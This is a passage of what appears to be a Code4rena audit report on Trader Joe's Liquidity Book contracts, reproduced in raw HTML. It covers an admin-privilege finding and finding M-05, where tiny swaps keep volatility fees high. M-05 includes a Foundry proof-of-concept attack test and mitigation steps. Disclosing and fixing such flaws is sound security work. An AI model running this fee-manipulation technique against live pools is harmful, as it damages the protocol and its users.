class=\"mtk11\">setFeesParametersOnPair</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">473</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setFeeRecipient</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_feeRecipient</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">479</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setFlashLoanFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_flashLoanFee</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">490</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setFactoryLockedState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_locked</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">498</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addQuoteAsset</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_quoteAsset</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">507</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">removeQuoteAsset</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_quoteAsset</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">525</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">forceDecay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ILBPair</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_LBPair</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">libraries</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PendingOwnable</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">59</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setPendingOwner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pendingOwner_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">68</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">revokePendingOwner</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">84</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">renounceOwnership</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>1- A timelock contract should be added to use <code>onlyOwner</code> privileges. In this way, users can be warned in case of a possible security weakness.\n2- <code>onlyOwner</code> can be a Multisign wallet and this part is specified in the documentation.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/139#issuecomment-1295745672\">0x0Louis (Trader Joe) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>The owner will be our multisig.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/139#issuecomment-1312832670\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Per the <a href=\"https://github.com/code-423n4/org/issues/8\">rulebook</a> will bulk all Admin Privilege findings under this one.</p>\n<p>Most notably the main issue was the lack of validation on the flashloan fee, which this issue acts as an umbrella for.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-05-attacker-can-keep-fees-max-at-no-cost\" style=\"position:relative;\"><a href=\"#m-05-attacker-can-keep-fees-max-at-no-cost\" aria-label=\"m 05 attacker can keep fees max at no cost permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/430\">[M-05] Attacker can keep fees max at no cost</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/430\">Trust</a>, also found by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/508\">shung</a> and <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/436\">immeas</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/FeeHelper.sol#L58-L72\">FeeHelper.sol#L58-L72</a><br></p>\n<p>The volatile fee component in TJ is calculated using several variables, as described <a href=\"https://docs.traderjoexyz.com/concepts/fees\">here</a>. Importantly, Va (volatility accumulator) = Vr (volatility reference) + binDelta:</p>\n<p>$v_a(k) = v_r + |i_r - (activeId + k)|$</p>\n<p>Vr is calculated depending on time passed since last swap:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">v_r = \\left{\\begin{matrix}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">v_r, &amp; t\\&lt;t_f  \\\\</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">R \\cdot  v_a &amp; t_f &lt;= t &lt; t_d \\\\</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">0, &amp; t_d &lt;= t</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\\end{matrix}\\right.</span></span></code></pre>\n<p>Below is the implementation:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function updateVariableFeeParameters(FeeParameters memory _fp, uint256 _activeId) internal view {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 _deltaT = block.timestamp - _fp.time;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (_deltaT &gt;= _fp.filterPeriod || _fp.time == 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _fp.indexRef = uint24(_activeId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (_deltaT &lt; _fp.decayPeriod) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    // This can&#39;t overflow as `reductionFactor &lt;= BASIS_POINT_MAX`</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    _fp.volatilityReference = uint24(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                        (uint256(_fp.reductionFactor) * _fp.volatilityAccumulated) / Constants.BASIS_POINT_MAX</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                _fp.volatilityReference = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _fp.time = (block.timestamp).safe40();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        updateVolatilityAccumulated(_fp, _activeId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>The critical issue is that when the time since last swap is below filterPeriod, Vr does not change, yet the last swap timestamp (_fp.time) is updated. Therefore, attacker (TJ competitor) can keep fees extremely high at basically 0 cost, by swapping just under every Tf seconds, a zero-ish amount. Since Vr will forever stay the same, the calculated Va will stay high (at least Vr) and will make the protocol completely uncompetitive around the clock.</p>\n<p>The total daily cost to the attacker would be  (TX fee (around <code>$0.05</code> on AVAX)  + swap fee (˜0) ) * filterPeriodsInDay (default value is 1728) = <code>$87</code>.</p>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Attacker can make any TraderJoe pair uncompetitive at negligible cost.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Add this test in LBPair.Fees.t.sol:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function testAbuseHighFeesAttack() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amountY = 30e18;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 id;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 reserveX;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 reserveY;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amountXInForSwap;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amountYInLiquidity = 100e18;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        FeeHelper.FeeParameters memory feeParams;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        addLiquidity(amountYInLiquidity, ID_ONE, 2501, 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //swap X -&gt; Y and accrue X fees</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (amountXInForSwap,) = router.getSwapIn(pair, amountY, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (reserveX,reserveY,id ) = pair.getReservesAndId();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        feeParams = pair.feeParameters();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;indexRef - start&quot; , feeParams.indexRef);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;volatilityReference - start&quot; , feeParams.volatilityReference);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;volatilityAccumulated - start&quot; , feeParams.volatilityAccumulated);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;active ID - start&quot; , id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;reserveX - start&quot; , reserveX);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;reserveY - start&quot; , reserveY);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // ATTACK step 1 - Cross many bins / wait for high volatility period</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        token6D.mint(address(pair), amountXInForSwap);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(ALICE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        pair.swap(true, DEV);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (reserveX,reserveY,id ) = pair.getReservesAndId();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        feeParams = pair.feeParameters();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;indexRef - swap1&quot; , feeParams.indexRef);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;volatilityReference - swap1&quot; , feeParams.volatilityReference);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;volatilityAccumulated - swap1&quot; , feeParams.volatilityAccumulated);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;active ID - swap1&quot; , id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;reserveX - swap1&quot; , reserveX);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;reserveY - swap1&quot; , reserveY);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // ATTACK step 2 - Decay the Va into Vr</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.warp(block.timestamp + 99);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        token18D.mint(address(pair), 10);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(ALICE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        pair.swap(false, DEV);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (reserveX,reserveY,id ) = pair.getReservesAndId();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;active ID - swap2&quot; , id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;reserveX - swap2&quot; , reserveX);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;reserveY - swap2&quot; , reserveY);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        feeParams = pair.feeParameters();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;indexRef - swap2&quot; , feeParams.indexRef);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;volatilityReference - swap2&quot; , feeParams.volatilityReference);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;volatilityAccumulated - swap2&quot; , feeParams.volatilityAccumulated);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // ATTACK step 3 - keep high Vr -&gt; high Va</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for(uint256 i=0;i&lt;10;i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            vm.warp(block.timestamp + 49);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            token18D.mint(address(pair), 10);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            vm.prank(ALICE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            pair.swap(false, DEV);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            (reserveX,reserveY,id ) = pair.getReservesAndId();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            console.log(&quot;**************&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            console.log(&quot;ITERATION &quot;, i);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            console.log(&quot;active ID&quot; , id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            console.log(&quot;reserveX&quot; , reserveX);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            console.log(&quot;reserveY&quot; , reserveY);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            feeParams = pair.feeParameters();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            console.log(&quot;indexRef&quot; , feeParams.indexRef);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            console.log(&quot;volatilityReference&quot; , feeParams.volatilityReference);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            console.log(&quot;volatilityAccumulated&quot; , feeParams.volatilityAccumulated);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            console.log(&quot;**************&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual audit, foundry</p>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Several options:</p>\n<ol>\n<li>Decay linearly to the time since last swap when T &#x3C; Tf.</li>\n<li>Don’t update _tf.time if swap did not affect Vr</li>\n<li>If <code>T&#x3C;Tf</code>, only skip Vr update if swap amount is not negligible. This will make the attack not worth it, as protocol will accrue enough fees to offset the lack of user activity.</li>\n</ol>\n<h3 id=\"severity-level\" style=\"position:relative;\"><a href=\"#severity-level\" aria-label=\"severity level permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity level</h3>\n<p>I argue for HIGH severity because I believe the impact to the protocol is that most users will favor alternative AMMs, which directly translates to a large loss of revenue. AMM is known to be a very competitive market and using high volatility fee <code>%</code> in low volatility times will not attract any users.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/430#issuecomment-1292424264\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Not sure about severity at this time, changing to group.</p>\n<p>Ultimately if invariant broken, High is appropriate, if Loss of Value Med more appropriate. Devil is in the detail.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/430#issuecomment-1297297728\">0x0Louis (Trader Joe) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>We acknowledge this issue, but we now reset the <code>indexRef</code> in the <code>forceDecay</code> function.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/430#issuecomment-1313916735\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how trivially a dust trade can be performed to keep fees higher than intended.</p>\n<p>Given the discussion above, considering that fees are more in line with loss of yield / capital inefficiency, I believe the finding to be of Medium Severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-06-calling-swapavaxforexacttokens-function-while-sending-excess-amount-cannot-refund-such-excess-amount\" style=\"position:relative;\"><a href=\"#m-06-calling-swapavaxforexacttokens-function-while-sending-excess-amount-cannot-refund-such-excess-amount\" aria-label=\"m 06 calling swapavaxforexacttokens function while sending excess amount cannot refund such excess amount permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/469\">[M-06] Calling <code>swapAVAXForExactTokens</code> function while sending excess amount cannot refund such excess amount</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/469\">rbserver</a>, also found by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/520\">lukris02</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/519\">Trust</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/494\">hyh</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/343\">pashov</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/329\">TomJ</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/290\">ElKu</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/253\">m_Rassska</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/245\">neumo</a>, <a 